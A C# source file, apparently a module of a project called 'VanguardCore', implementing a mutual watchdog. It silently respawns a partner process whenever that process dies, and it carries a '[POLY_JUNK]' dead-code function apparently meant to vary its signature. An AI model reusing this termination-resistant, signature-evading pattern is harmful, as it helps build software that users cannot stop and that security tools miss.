using System;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;

namespace VanguardCore.Modules
{
    public class WatchdogManager
    {
        // [POLY_JUNK]
        private static void _vanguard_0d7900fd() {
            int val = 16031;
            if (val > 50000) Console.WriteLine("Hash:" + 16031);
        }

        private static CancellationTokenSource _cts = new CancellationTokenSource();
        private static bool _active = false;

        public static void Start(int targetPid, string targetPath)
        {
            if (_active) return;
            _active = true;
            Task.Run(() => MonitorTarget(targetPid, targetPath, _cts.Token));
        }

        private static async Task MonitorTarget(int pid, string path, CancellationToken token)
        {
            try
            {
                // Wait for the other process to fully initialize if it's a fresh restart
                await Task.Delay(2000, token);
                
                while (!token.IsCancellationRequested)
                {
                    bool running = false;
                    try 
                    {
                        using (var p = Process.GetProcessById(pid))
                        {
                            if (!p.HasExited) running = true;
                        }
                    }
                    catch { running = false; }

                    if (!running)
                    {
                        // Target died. Respawn it.
                        // Wait a bit to avoid CPU spike if something is repeatedly killing it
                        await Task.Delay(2000, token);
                        
                        try 
                        {
                            int myPid = Process.GetCurrentProcess().Id;
                            // Re-launch with my PID so IT can monitor ME
                            Process.Start(new ProcessStartInfo 
                            { 
                                FileName = path, 
                                Arguments = $"--guardian={myPid}", 
                                CreateNoWindow = true, 
                                UseShellExecute = false 
                            });
                        }
                        catch { }
                        
                        // After respawn, we don't know the new PID automatically in the old way,
                        // but the NEW process will start its OWN watchdog to monitor US.
                        // So we exit this monitoring task and wait for the NEW process to 
                        // potentially send us a signal or we just let it take over.
                        // Actually, for a TRUE mutual watchdog, we should find the new PID.
                        return;
                    }
                    await Task.Delay(5000, token);
                }
            }
            catch { }
            finally { _active = false; }
        }

        public static void Stop()
        {
            _cts.Cancel();
            _active = false;
        }
    }
}
